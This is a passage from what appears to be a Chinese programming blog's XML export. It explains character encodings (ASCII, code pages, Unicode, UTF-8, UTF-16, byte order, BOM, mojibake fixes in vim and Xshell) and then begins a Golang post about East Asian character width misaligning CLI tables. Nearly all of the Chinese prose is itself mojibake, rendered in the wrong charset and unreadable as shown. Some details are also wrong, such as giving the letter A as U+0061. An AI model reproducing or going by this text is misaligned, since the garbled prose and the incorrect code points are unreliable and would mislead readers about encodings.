Â≠ó‰Ωì‚ÄùÊàñ‚ÄùÊâ©Â±ïASCIIÁ†Å‚ÄùÔºå‰∏∫Áî®Êà∑Êèê‰æõÊºÇ‰∫ÆÁöÑÂõæÂΩ¢ÊñáÂ≠óÊù•ÁªòÂà∂ÊñáÊú¨Ê°ÜÂπ∂ÊîØÊåÅ‰∏Ä‰∫õÊ¨ßÊ¥≤Â≠óÁ¨¶Ôºå‰æãÂ¶ÇËã±ÈïëÔºà¬£ÔºâÁ¨¶Âè∑„ÄÇÂÜçÂº∫Ë∞É‰∏ÄÈÅçÔºåASCIIÁ†ÅÁöÑÈóÆÈ¢òÂú®‰∫éÂ∞ΩÁÆ°ÊâÄÊúâ‰∫∫ÈÉΩÂú®0-127Âè∑Â≠óÁ¨¶ÁöÑ‰ΩøÁî®‰∏äËææÊàê‰∫Ü‰∏ÄËá¥Ôºå‰ΩÜÂØπ‰∫é128-255Âè∑Â≠óÁ¨¶Âç¥ÊúâÂæàÂ§öÂæàÂ§ö‰∏çÂêåÁöÑËß£Èáä„ÄÇ‰Ω†ÂøÖÈ°ªÂëäËØâËÆ°ÁÆóÊú∫‰ΩøÁî®Âì™ÁßçÈ£éÊ†ºÁöÑASCIIÁ†ÅÊâçËÉΩÊ≠£Á°ÆÊòæÁ§∫128-255Âè∑ÁöÑÂ≠óÁ¨¶„ÄÇËøôÂØπ‰∫éÂåóÁæé‰∫∫Âíå‰∏çÂàóÈ¢†Áæ§Â≤õÁöÑ‰∫∫Êù•ËØ¥‰∏çÁÆó‰ªÄ‰πàÈóÆÈ¢òÔºåÂõ†‰∏∫Êó†ËÆ∫‰ΩøÁî®Âì™ÁßçÈ£éÊ†ºÁöÑASCIIÁ†ÅÔºåÊãâ‰∏ÅÂ≠óÊØçÁöÑÊòæÁ§∫ÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇËã±ÂõΩ‰∫∫ËøòÈúÄË¶ÅÈù¢ÂØπÁöÑÈóÆÈ¢òÊòØÂéüÂßãÁöÑASCIIÁ†Å‰∏≠‰∏çÂåÖÂê´Ëã±ÈïëÁ¨¶Âè∑Ôºå‰ΩÜÊòØËøô‰∏™Â∑≤ÁªèÊó†ÂÖ≥Á¥ßË¶Å‰∫Ü„ÄÇ‰∏éÊ≠§ÂêåÊó∂ÔºåÂú®‰∫öÊ¥≤ÊúâÊõ¥ËÆ©‰∫∫Â§¥ÁñºÁöÑÈóÆÈ¢ò„ÄÇ‰∫öÊ¥≤ËØ≠Ë®ÄÊúâÊõ¥Â§öÁöÑÂ≠óÁ¨¶ÂíåÂ≠óÂΩ¢ÈúÄË¶ÅË¢´Â≠òÂÇ®Ôºå‰∏Ä‰∏™Â≠óËäÇÂ∑≤Áªè‰∏çÂ§üÁî®‰∫Ü„ÄÇÊâÄ‰ª•‰ªñ‰ª¨ÂºÄÂßã‰ΩøÁî®‰∏§‰∏™Â≠óËäÇÊù•Â≠òÂÇ®Â≠óÁ¨¶ÔºåËøôË¢´Áß∞‰ΩúDBCSÔºàÂèåÂ≠óËäÇÁºñÁ†ÅÊñπÊ°àÔºâ„ÄÇÂú®DBCS‰∏≠ÔºåÂ≠óÁ¨¶‰∏≤Êìç‰ΩúÂèòÂæóÂæàËõãÁñºÔºå‰Ω†Â∫îËØ•ÊÄé‰πàÂÅöstr++Êàñstr‚ÄìÔºüËøô‰∫õÈóÆÈ¢òÊàê‰∏∫‰∫ÜÁ≥ªÁªüÂºÄÂèëËÄÖÁöÑÂô©Ê¢¶„ÄÇ‰æãÂ¶ÇÔºåMS DOSÂøÖÈ°ªÊîØÊåÅÊâÄÊúâÈ£éÊ†ºÁöÑASCIIÁ†ÅÔºåÂõ†‰∏∫‰ªñ‰ª¨ÊÉ≥ÊääËΩØ‰ª∂ÂçñÂà∞ÂÖ∂‰ªñÂõΩÂÆ∂Âéª„ÄÇ‰ªñ‰ª¨ÊèêÂá∫‰∫Ü„ÄåÂÜÖÁ†ÅË°®„ÄçËøô‰∏ÄÊ¶ÇÂøµ„ÄÇ‰æãÂ¶ÇÔºå‰Ω†ÈúÄË¶ÅÂëäËØâDOSÔºàÈÄöËøá‰ΩøÁî®‚Äùchcp‚ÄùÂëΩ‰ª§Ôºâ‰Ω†ÊÉ≥‰ΩøÁî®‰øùÂä†Âà©‰∫öËØ≠ÁöÑÂÜÖÁ†ÅË°®ÔºåÂÆÉÊâçËÉΩÊòæÁ§∫‰øùÂä†Âà©‰∫öÂ≠óÊØç„ÄÇÂÜÖÁ†ÅË°®ÁöÑÊõ¥Êç¢‰ºöÂ∫îÁî®Âà∞Êï¥‰∏™Á≥ªÁªü„ÄÇËøôÂØπ‰ΩøÁî®Â§öÁßçËØ≠Ë®ÄÂ∑•‰ΩúÁöÑ‰∫∫Êù•ËØ¥ÊòØ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂõ†‰∏∫‰ªñ‰ª¨ÂøÖÈ°ªÈ¢ëÁπÅÁöÑÂú®Âá†‰∏™ÂÜÖÁ†ÅË°®‰πãÈó¥Êù•ÂõûÂàáÊç¢„ÄÇÂ∞ΩÁÆ°ÂÜÖÁ†ÅË°®ÊòØ‰∏Ä‰∏™Â•Ω‰∏ªÊÑèÔºå‰ΩÜÊòØÂÆÉ‰∏çÊòØ‰∏Ä‰∏™ÁÆÄÊ¥ÅÁöÑËß£ÂÜ≥ÊñπÊ°àÔºåÂÆÉÂè™ÊòØ‰∏Ä‰∏™hackÊäÄÊúØÊàñËÄÖËØ¥ÊòØÁÆÄÂçïÁöÑ‰øÆÊ≠£Êù•ËÆ©ÁºñÁ†ÅÁ≥ªÁªüÂèØ‰ª•Â∑•‰Ωú„ÄÇ UnicodeÁöÑ‰∏ñÁïåÊúÄÁªàÔºåÁæéÂõΩ‰∫∫ÊÑèËØÜÂà∞‰ªñ‰ª¨Â∫îËØ•ÊèêÂá∫‰∏ÄÁßçÊ†áÂáÜÊñπÊ°àÊù•Â±ïÁ§∫‰∏ñÁïå‰∏äÊâÄÊúâËØ≠Ë®Ä‰∏≠ÁöÑÊâÄÊúâÂ≠óÁ¨¶Ôºå‰ª•‰æøÁºìËß£Á®ãÂ∫èÂëòÁöÑÁóõËã¶ÂíåÈÅøÂÖçÂ≠óÁ¨¶ÁºñÁ†ÅÂºïÂèëÁöÑÁ¨¨‰∏âÊ¨°‰∏ñÁïåÂ§ßÊàò„ÄÇÂá∫‰∫éËøô‰∏™ÁõÆÁöÑÔºåUnicodeËØûÁîü‰∫Ü„ÄÇUnicodeËÉåÂêéÁöÑÊÉ≥Ê≥ïÈùûÂ∏∏ÁÆÄÂçïÔºåÁÑ∂ËÄåÂç¥Ë¢´ÊôÆÈÅçÁöÑËØØËß£‰∫Ü„ÄÇUnicodeÂ∞±ÂÉè‰∏Ä‰∏™ÁîµËØùÊú¨ÔºåÊ†áËÆ∞ÁùÄÂ≠óÁ¨¶ÂíåÊï∞Â≠ó‰πãÈó¥ÁöÑÊò†Â∞ÑÂÖ≥Á≥ª„ÄÇJoelÁß∞‰πã‰∏∫„ÄåÁ•ûÂ•áÊï∞Â≠ó„ÄçÔºåÂõ†‰∏∫ÂÆÉ‰ª¨ÂèØËÉΩÊòØÈöèÊú∫ÊåáÂÆöÁöÑÔºåËÄå‰∏î‰∏ç‰ºöÁªôÂá∫‰ªª‰ΩïËß£Èáä„ÄÇÂÆòÊñπÊúØËØ≠ÊòØÁ†Å‰Ωç(Code Point)ÔºåÊÄªÊòØÁî®U+ÂºÄÂ§¥„ÄÇÁêÜËÆ∫‰∏äÊØèÁßçËØ≠Ë®Ä‰∏≠ÁöÑÊØèÁßçÂ≠óÁ¨¶ÈÉΩË¢´UnicodeÂçè‰ºöÊåáÂÆö‰∫Ü‰∏Ä‰∏™Á•ûÂ•áÊï∞Â≠ó„ÄÇ‰æãÂ¶ÇÂ∏å‰ºØÊù•Êñá‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÊØç◊êÔºåÊòØU+2135ÔºåÂ≠óÊØçAÊòØU+0061„ÄÇUnicodeÂπ∂‰∏çÊ∂âÂèäÂ≠óÁ¨¶ÊòØÊÄé‰πàÂú®Â≠óËäÇ‰∏≠Ë°®Á§∫ÁöÑÔºåÂÆÉ‰ªÖ‰ªÖÊåáÂÆö‰∫ÜÂ≠óÁ¨¶ÂØπÂ∫îÁöÑÊï∞Â≠óÔºå‰ªÖÊ≠§ËÄåÂ∑≤„ÄÇÂÖ≥‰∫éUnicodeÁöÑÂÖ∂ÂÆÉËØØËß£ÂåÖÊã¨ÔºöUnicodeÊîØÊåÅÁöÑÂ≠óÁ¨¶‰∏äÈôêÊòØ65536‰∏™ÔºåUnicodeÂ≠óÁ¨¶ÂøÖÈ°ªÂç†‰∏§‰∏™Â≠óËäÇ„ÄÇÂëäËØâ‰Ω†Ëøô‰∫õÁöÑ‰∫∫Â∫îËØ•ÂéªÊç¢Êç¢ËÑëÂ≠ê‰∫Ü„ÄÇËÆ∞‰ΩèÔºåUnicodeÂè™ÊòØ‰∏Ä‰∏™Áî®Êù•Êò†Â∞ÑÂ≠óÁ¨¶ÂíåÊï∞Â≠óÁöÑÊ†áÂáÜ„ÄÇÂÆÉÂØπÊîØÊåÅÂ≠óÁ¨¶ÁöÑÊï∞ÈáèÊ≤°ÊúâÈôêÂà∂Ôºå‰πü‰∏çË¶ÅÊ±ÇÂ≠óÁ¨¶ÂøÖÈ°ªÂç†‰∏§‰∏™„ÄÅ‰∏â‰∏™ÊàñËÄÖÂÖ∂ÂÆÉ‰ªªÊÑèÊï∞ÈáèÁöÑÂ≠óËäÇ„ÄÇUnicodeÂ≠óÁ¨¶ÊòØÊÄéÊ†∑Ë¢´ÁºñÁ†ÅÊàêÂÜÖÂ≠ò‰∏≠ÁöÑÂ≠óËäÇËøôÊòØÂè¶Â§ñÁöÑËØùÈ¢òÔºåÂÆÉÊòØË¢´UTF(Unicode Transformation Formats)ÂÆö‰πâÁöÑ„ÄÇ UnicodeÁöÑÂÆûÁé∞‰∏§‰∏™ÊúÄÊµÅË°åÁöÑUnicodeÁºñÁ†ÅÊñπÊ°àÊòØUTF-8ÂíåUTF-16„ÄÇËÆ©Êàë‰ª¨ÁúãÁúãÂÆÉ‰ª¨ÁöÑÁªÜËäÇUTF-8ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÊÉäËâ≥ÁöÑÊ¶ÇÂøµÔºåÂÆÉÊºÇ‰∫ÆÁöÑÂÆûÁé∞‰∫ÜÂØπASCIIÁ†ÅÁöÑÂêëÂêéÂÖºÂÆπÔºå‰ª•‰øùËØÅUnicodeÂèØ‰ª•Ë¢´Â§ß‰ºóÊé•Âèó„ÄÇÂèëÊòéÂÆÉÁöÑ‰∫∫Ëá≥Â∞ëÂ∫îËØ•Âæó‰∏™ËØ∫Ë¥ùÂ∞îÂíåÂπ≥Â•ñ„ÄÇÂú®UTF-8‰∏≠Ôºå0-127Âè∑ÁöÑÂ≠óÁ¨¶Áî®1‰∏™Â≠óËäÇÊù•Ë°®Á§∫Ôºå‰ΩøÁî®ÂíåUS-ASCIIÁõ∏ÂêåÁöÑÁºñÁ†Å„ÄÇËøôÊÑèÂë≥ÁùÄ1980Âπ¥‰ª£ÂÜôÁöÑÊñáÊ°£Áî®UTF-8ÊâìÂºÄ‰∏ÄÁÇπÈóÆÈ¢òÈÉΩÊ≤°Êúâ„ÄÇÂè™Êúâ128Âè∑Âèä‰ª•‰∏äÁöÑÂ≠óÁ¨¶ÊâçÁî®2‰∏™Ôºå3‰∏™ÊàñËÄÖ4‰∏™Â≠óËäÇÊù•Ë°®Á§∫„ÄÇÂõ†Ê≠§ÔºåUTF-8Ë¢´Áß∞‰ΩúÂèØÂèòÈïøÂ∫¶ÁºñÁ†Å„ÄÇ0100100001000101010011000100110001001111Ëøô‰∏™Â≠óËäÇÊµÅÂú®ASCIIÂíåUTF-8‰∏≠Ë°®Á§∫Áõ∏ÂêåÁöÑÂ≠óÁ¨¶ÔºöHELLOÂè¶‰∏Ä‰∏™ÊµÅË°åÁöÑÂèØÂèòÈïøÂ∫¶ÁºñÁ†ÅÊñπÊ°àÊòØUTF-16ÔºåÂÆÉ‰ΩøÁî®2‰∏™ÊàñËÄÖ4‰∏™Â≠óËäÇÊù•Â≠òÂÇ®Â≠óÁ¨¶„ÄÇÁÑ∂ËÄåÔºå‰∫∫‰ª¨ÈÄêÊ∏êÊÑèËØÜÂà∞UTF-16ÂèØËÉΩ‰ºöÊµ™Ë¥πÂ≠òÂÇ®Á©∫Èó¥Ôºå‰ΩÜÈÇ£ÊòØÂè¶‰∏Ä‰∏™ËØùÈ¢ò‰∫Ü„ÄÇ ÁºñÁ†ÅÊéíÂ∫è‰ΩéÂ≠óËäÇÂ∫è(Little Endian)ÂíåÈ´òÂ≠óËäÇÂ∫è(Big Endian)EndianËØª‰ΩúEnd-ianÊàñËÄÖIndian„ÄÇËøô‰∏™ÊúØËØ≠ÁöÑËµ∑Ê∫êÂèØ‰ª•ËøΩÊ∫ØÂà∞Ê†ºÂàó‰ΩõÊ∏∏ËÆ∞„ÄÇÔºàÂ∞èËØ¥‰∏≠ÔºåÂ∞è‰∫∫ÂõΩ‰∏∫Ê∞¥ÁÖÆËõãÂ∫îËØ•‰ªéÂ§ßÁöÑ‰∏ÄÁ´ØÔºàBig-EndÔºâÂâ•ÂºÄËøòÊòØÂ∞èÁöÑ‰∏ÄÁ´ØÔºàLittle-EndÔºâÂâ•ÂºÄËÄå‰∫âËÆ∫Ôºå‰∫âËÆ∫ÁöÑÂèåÊñπÂàÜÂà´Ë¢´Áß∞‰∏∫‚ÄúÂ§ßÁ´ØÊ¥æ‚ÄùÂíå‚ÄúÂ∞èÁ´ØÊ¥æ‚Äù„ÄÇÔºâ‰ΩéÂ≠óËäÇÂ∫èÂíåÈ´òÂ≠óËäÇÂ∫èÂè™ÊòØ‰∏Ä‰∏™ÂÖ≥‰∫éÂú®ÂÜÖÂ≠ò‰∏≠Â≠òÂÇ®ÂíåËØªÂèñ‰∏ÄÊÆµÂ≠óËäÇÔºàË¢´Áß∞‰ΩúwordsÔºâÁöÑÁ∫¶ÂÆö„ÄÇËøôÊÑèÂë≥ÁùÄÂΩì‰Ω†ËÆ©ËÆ°ÁÆóÊú∫Áî®UTF-16ÊääÂ≠óÊØçAÔºàÂç†‰∏§‰∏™Â≠óËäÇÔºâÂ≠òÂú®ÂÜÖÂ≠ò‰∏≠Êó∂Ôºå‰ΩøÁî®Âì™ÁßçÂ≠óËäÇÂ∫èÊñπÊ°àÂÜ≥ÂÆö‰∫Ü‰Ω†ÊääÁ¨¨‰∏Ä‰∏™Â≠óËäÇÊîæÂú®Á¨¨‰∫å‰∏™Â≠óËäÇÁöÑÂâçÈù¢ËøòÊòØÂêéÈù¢„ÄÇËøô‰πàËØ¥ÊúâÁÇπ‰∏çÂ§™ÂÆπÊòìÊáÇÔºåËÆ©Êàë‰ª¨Êù•Áúã‰∏Ä‰∏™‰æãÂ≠êÔºöÂΩì‰Ω†‰ΩøÁî®UTF-16Â≠ò‰∏ãÊù•Ëá™‰Ω†ÊúãÂèãÁöÑÈôÑ‰ª∂Êó∂ÔºåÂú®‰∏çÂêåÁöÑÁ≥ªÁªü‰∏≠ÂÆÉÁöÑÂêéÂçäÈÉ®ÂàÜÂèØËÉΩÊòØËøôÊ†∑ÁöÑÔºö00 68 00 65 00 6C 00 6C 00 6FÔºàÈ´òÂ≠óËäÇÂ∫èÔºåÈ´ò‰ΩçÂ≠óËäÇË¢´Â≠òÂú®ÂâçÈù¢Ôºâ68 00 65 00 6C 00 6C 00 6F 00Ôºà‰ΩéÂ≠óËäÇÂ∫èÔºå‰Ωé‰ΩçÂ≠óËäÇË¢´Â≠òÂú®ÂâçÈù¢ÔºâÂ≠óËäÇÂ∫èÊñπÊ°àÂè™ÊòØ‰∏Ä‰∏™ÂæÆÂ§ÑÁêÜÂô®Êû∂ÊûÑËÆæËÆ°ËÄÖÁöÑÂÅèÂ•ΩÈóÆÈ¢òÔºå‰æãÂ¶ÇÔºåIntel‰ΩøÁî®‰ΩéÂ≠óËäÇÂ∫èÔºåMotorola‰ΩøÁî®È´òÂ≠óËäÇÂ∫è„ÄÇ Â≠óËäÇÈ°∫Â∫èÊ†áËÆ∞Â¶ÇÊûú‰Ω†ÁªèÂ∏∏Ë¶ÅÂú®È´ò‰ΩéÂ≠óËäÇÂ∫èÁöÑÁ≥ªÁªüÈó¥ËΩ¨Êç¢ÊñáÊ°£ÔºåÂπ∂‰∏îÂ∏åÊúõÂå∫ÂàÜÂ≠óËäÇÂ∫èÔºåËøòÊúâ‰∏ÄÁßçÂ•áÊÄ™ÁöÑÁ∫¶ÂÆöÔºåË¢´Áß∞‰ΩúBOM„ÄÇBOMÊòØ‰∏Ä‰∏™ËÆæËÆ°ÂæóÂæàÂ∑ßÂ¶ôÁöÑÂ≠óÁ¨¶ÔºåÁî®Êù•ÊîæÂú®ÊñáÊ°£ÁöÑÂºÄÂ§¥ÂëäËØâÈòÖËØªÂô®ËØ•ÊñáÊ°£ÁöÑÂ≠óËäÇÂ∫è„ÄÇÂú®UTF-16‰∏≠ÔºåÂÆÉÊòØÈÄöËøáÂú®Á¨¨‰∏Ä‰∏™Â≠óËäÇÊîæÁΩÆFE FFÊù•ÂÆûÁé∞ÁöÑ„ÄÇÂú®‰∏çÂêåÂ≠óËäÇÂ∫èÁöÑÊñáÊ°£‰∏≠ÔºåÂÆÉ‰ºöË¢´ÊòæÁ§∫ÊàêFF FEÊàñËÄÖFE FFÔºåÊ∏ÖÊ•öÁöÑÊääËøôÁØáÊñáÊ°£ÁöÑÂ≠óËäÇÂ∫èÂëäËØâ‰∫ÜËß£ÈáäÂô®„ÄÇ BOMÂ∞ΩÁÆ°ÂæàÊúâÁî®Ôºå‰ΩÜÂπ∂‰∏çÊòØÂæàÁÆÄÊ¥ÅÔºåÂõ†‰∏∫ËøòÊúâ‰∏Ä‰∏™Á±ª‰ººÁöÑÊ¶ÇÂøµÔºåÁß∞‰Ωú„ÄåÈ≠îÊúØÂ≠ó„Äç(Magic Byte)ÔºåÂæàÂ§öÂπ¥Êù•‰∏ÄÁõ¥Ë¢´Áî®Êù•Ë°®ÊòéÊñá‰ª∂ÁöÑÊ†ºÂºè„ÄÇBOMÂíåÈ≠îÊúØÂ≠óÈó¥ÁöÑÂÖ≥Á≥ª‰∏ÄÁõ¥Ê≤°ÊúâË¢´Ê∏ÖÊ•öÁöÑÂÆö‰πâËøáÔºåÂõ†Ê≠§ÊúâÁöÑËß£ÈáäÂô®‰ºöÊêûÊ∑∑ÂÆÉ‰ª¨„ÄÇ Â∏∏ËßÅÁöÑÁºñÁ†ÅÂºïËµ∑ÁöÑÈóÆÈ¢òÊàë‰ª¨ÁúãÂà∞ÁöÑ‰ªª‰ΩïËæìÂá∫ÔºåÈÉΩÊòØÁ®ãÂ∫èÂ±ïÁ§∫Êàë‰ª¨ÁöÑÔºåÁ®ãÂ∫èÊ†πÊçÆÁºñÁ†ÅÊù•ËøõË°åËøô‰∏™Êò†Â∞ÑÂÖ≥Á≥ªÁöÑËΩ¨Êç¢ÔºåÂ¶ÇÊûúÁ®ãÂ∫èÊääËøôÁºñÁ†ÅÊêûÈîô‰∫ÜÔºåÂ∞±‰ºöÂá∫Áé∞‰π±Á†ÅÈóÆÈ¢òÂΩìËΩØ‰ª∂‰∏çËÉΩÁ°ÆÂÆöÁºñÁ†ÅÁöÑÊó∂ÂÄôÔºåÂÆÉ‰ºöÁåúÊµã„ÄÇÂ§ßÈÉ®ÂàÜÊó∂ÂÄôÔºåÂÆÉ‰ºöÁåúÊµãÊòØÂê¶ÊòØÊ∂µÁõñ‰∫ÜASCIIÁ†ÅÁöÑUTF-8ÔºåËøòÊòØISO-8859-1Ôºå‰πüÊúâÂèØËÉΩÁåúÂÖ∂‰ªñËÉΩÊÉ≥Âà∞ÁöÑ‰ªªÊÑèÂ≠óÁ¨¶ÈõÜ„ÄÇÂõ†‰∏∫Ëã±Êñá‰∏≠‰ΩøÁî®ÁöÑÊãâ‰∏ÅÂ≠óÊØçË°®Âú®Âá†‰πéÊâÄÊúâÁöÑÂ≠óÁ¨¶ÈõÜ‰∏≠ÈÉΩËÉΩÊòæÁ§∫ÔºåÂåÖÊã¨UTF-8ÔºåÊâÄ‰ª•Âç≥‰ΩøÁºñÁ†ÅÁåúÈîô‰∫ÜÔºåËã±ÊñáÂ≠óÊØçÁúãËµ∑Êù•‰πüÊòØÊ≠£Á°ÆÁöÑ„ÄÇ ÊµèËßàÂô®‰π±Á†ÅÈóÆÈ¢òÂ¶ÇÊûú‰Ω†Âú®ÊµèËßàÁΩëÈ°µÊó∂ÁúãÂà∞ÔøΩÁ¨¶Âè∑ÔºåËøôÊÑèÂë≥ÁùÄËøô‰∏™ÁΩëÈ°µÁöÑÁºñÁ†Å‰∏çÊòØ‰Ω†ÁöÑÊµèËßàÂô®ÁåúÊµãÁöÑÈÇ£‰∏™„ÄÇËøôÊó∂‰Ω†ÂèØ‰ª•ÁÇπÂºÄÊµèËßàÂô®ÁöÑÊü•Áúã-&gt;Â≠óÁ¨¶ÁºñÁ†ÅËèúÂçïÊù•Â∞ùËØï‰∏çÂêåÁöÑÁºñÁ†Å„ÄÇ ÂØπ‰∫éÁ®ãÂ∫èÂºÄÂèëËÄÖÊù•ËØ¥ÔºåÂõ†ÈÅøÂÖçËÆ©ÊµèËßàÂô® ÁåúÊµãÊñáÊ°£ÁöÑÁºñÁ†ÅÔºåÂõ†Ê≠§Ôºö Ê∞∏ËøúËÆ∞ÂæóÈÄöËøáContent-TypeÊàñËÄÖmeta charsetÊ†áÁ≠æÊù•ÊòæÂºèÊåáÂÆö‰Ω†ÁöÑÊñáÊ°£ÁöÑÁºñÁ†Å„ÄÇËøôÊ†∑ÊµèËßàÂô®Â∞±‰∏çÈúÄË¶ÅÁåúÊµã‰Ω†‰ΩøÁî®ÁöÑÁºñÁ†Å‰∫ÜÔºå‰ªñ‰ª¨‰ºöÂáÜÁ°ÆÁöÑ‰ΩøÁî®‰Ω†ÊåáÂÆöÁöÑÁºñÁ†ÅÊù•Ê∏≤ÊüìÊñáÊ°£„ÄÇ ÁºñËæëÂô®‰π±Á†ÅÈóÆÈ¢ò‰æãÂ¶Ç ÊàëÁî® vim ÊâìÂºÄ‰∏Ä‰∏™ utf8 ÁºñÁ†ÅÁöÑÊñá‰ª∂ÔºöÈÄöËøáËæìÂÖ• set encoding Ôºå‰ºöÂèëÁé∞Ê≠§Êó∂ÁºñËæëÂô® ‰ΩøÁî®ÁöÑÁºñÁ†ÅÊòØ latin1ÈÄöËøá set encoding=utf8 ÔºåÊääÁºñÁ†ÅËΩ¨Êç¢ËøáÊù•Â¶ÇÊûúÊÉ≥Ëøô‰∏™ÈÖçÁΩÆÊ∞∏‰πÖÁîüÊïà ÔºåËØ∑ÂÜôÂÖ•vim ÁöÑÈÖçÁΩÆÊñá‰ª∂Âêß Xshell ËôöÊãüÁªàÁ´Ø‰π±Á†ÅÈóÆÈ¢òÊàëÂú®xshellÁªàÁ´Ø‰∏ã tail ‰∏Ä‰∏™utf8 ÁºñÁ†ÅÁöÑÊñá‰ª∂ÔºåËøô‰∏™ÂëΩ‰ª§ÂèñÂæóÁöÑÁªìÊûú‰ºöÈÄÅÂà∞ Xshell ÁªàÁ´Ø ÔºåÁÑ∂ÂêéÊúâXshell ÁªàÁ´ØËøõË°åËß£Á†ÅÔºåÂ±ïÁ§∫Âú®Êàë‰ª¨Èù¢ÂâçÂéüÊú¨ÁöÑÊï∞ÊçÆ ÊòØutf8ÁºñÁ†ÅÁöÑÔºå‰ΩÜÊòØÊàë‰ª¨ÁªàÁ´Ø Âç¥ÈÄâÁî®Arabic Êù•ËøõË°åËß£Á†ÅÔºåÊâÄ‰ª•‰π±Á†ÅÁé∞Âú®Êàë‰ª¨Â∞ÜXshell ÁöÑÁºñÁ†ÅÊç¢Êàê utf8 ÊÄªÁªìÁºñÁ†ÅË°® Â∞±ÊòØ‰∏ÄÂº†Êò†Â∞ÑË°®Ôºå‰∏çÂêåÁöÑÁºñÁ†ÅÊúâËá™Â∑±ÁöÑÊò†Â∞ÑËßÑÂàô12Êï∞ÊçÆ ‚Äî‚Äî‚Äì&gt; ‰∫åËøõÂà∂ ÔºàËΩØ‰ª∂Êù•ÁºñÁ†ÅÔºâ‰∫åËøõÂà∂ ‚Äî‚Äî‚Äì&gt; Êï∞ÊçÆ ÔºàËΩØ‰ª∂Êù•Ëß£Á†ÅÔºâ Â¶ÇÊûúÁºñÁ†ÅÂíåËß£Á†Å‰∏çÊòØÂêå‰∏ÄÁßçÁºñÁ†ÅÔºåÈÇ£‰πàÂ∞±‰ºöÂá∫Áé∞‰π±Á†ÅÔºåËøô‰∏™Âä†ÂØÜËß£Á†Å‰∏Ä‰∏™ÈÅìÁêÜ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangËé∑ÂèñÂ≠óÁ¨¶ÁöÑÂÆΩÂ∫¶(East_Asian_Width)]]></title>
    <url>%2F2017%2F05%2F10%2Fgolang-char-width%2F</url>
    <content type="text"><![CDATA[ÊúÄËøëÂú®Áî®golangÂÜôCLI, Êï∞ÊçÆÂú®ÁªàÁ´Ø‰ª•TableÊñπÂºèÂ±ïÁ§∫ÂíåMySLQËæìÂá∫ÁöÑË°®Ê†º‰∏ÄÊ†∑, ‰ΩøÁî®ÁöÑÊòØ‰∏Ä‰∏™GitHub‰∏ä‰∏çÊÄé‰πàÂá∫ÂêçÁöÑÈ°πÁõÆ, Âõ†‰∏∫ËØ•È°πÁõÆÈÄªËæëÊ∏ÖÊô∞, ÂäüËÉΩ‰πüÂÆåÂñÑ, Ëá™Â∑±‰πüËÉΩÂæàÂ•ΩÁöÑÁúãÊáÇ, ÂÆπÊòìÁª¥Êä§, ‰ΩÜÊòØÂâç‰∫õÂ§©Âá∫‰∫Ü‰∏Ä‰∏™ÈóÆÈ¢ò: ÂΩïÂÖ•‰∏≠ÊñáÂ≠óÁ¨¶Âíå‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶Ëøá‰ºöËÆ©TableÊó†Ê≥ïÂØπÈΩê, ÊàëÂ∑≤ÁªèforkËøáÊù•‰øÆÂ§ç‰∫Ü, ‰ΩÜÊòØÂÖ∂‰∏≠Ê∂âÂèäÂà∞ÁöÑÁü•ËØÜÁÇπ, ÊÉ≥ÈÄöËøáËøôÁØáÂçöÂÆ¢Êù•ËÆ≤Ê∏ÖÊ•ö„ÄÇ ÈóÆÈ¢òÊàë‰ΩøÁî®‰∏Ä‰∏™Âè´simpletalbeÁöÑÂ∫ì: GitHubÂú∞ÂùÄ, Êàë‰ΩøÁî®‰ªñÁöÑ‰æãÂ≠ê, Ê∑ªÂä†‰∫Ü‰∏ÄË°å‰∏≠ÊñáËæìÂÖ•ÔºåÁªìÊûúÊòØËøôÊ†∑ÁöÑ:123456789101112131415161718Default style+----+------------------+--------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+--------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | ‰∏≠ÊñáÂ§πÊ∏£ abc | ÁâπÊÆäÂ≠óÁ¨¶Â§πÊ∏£ ‚ÑÉ | JuanJKennedy@dayrep.com | 16 |+----+------------------+--------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+--------------+-----------------------------+------+ ‰ªîÁªÜËßÇÂØüÂèØ‰ª•ÂèëÁé∞ÈóÆÈ¢ò, ‰∏Ä‰∏™‰∏≠ÊñáÁöÑÂÆΩÂ∫¶ÊòØ2‰∏™Ëã±ÊñáÂ≠óÁ¨¶ÁöÑÂÆΩÂ∫¶,‰ΩÜÊòØ‰ªñÂç¥‰æùÁÑ∂‰ΩøÁî®1‰∏™ÂÆΩÂ∫¶Êù•ËÆ°ÁÆó, Ëá¥‰ΩøÂÆûÈôÖÂ≠óÁ¨¶ÁöÑÂÆΩÂ∫¶Â∞ëÁÆó‰∫Ü4‰Ωç, ÊâÄ‰ª•Á¨¨‰∏Ä‰∏™NameË°®Ê†ºÂ≠óÁ¨¶Â§öÂá∫Âéª‰∫Ü4‰∏™Â≠óÁ¨¶ÂÆΩÂ∫¶„ÄÇ Ëøô‰∏™ÈóÆÈ¢òÁöÑÊú¨Ë¥®ÊòØ‰∏Ä‰∏™ÁºñÁ†ÅÈóÆÈ¢ò, Áî±‰∫éGolangÂÜÖÈÉ®Â≠óÁ¨¶Áªü‰∏Ä‰ΩøÁî®UnicodeÁºñÁ†Å, ÊâÄ‰ª•ÈóÆÈ¢òÂÆö‰Ωç‰∏∫ unicode ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶ÂÆΩÂ∫¶ÈóÆÈ¢ò, 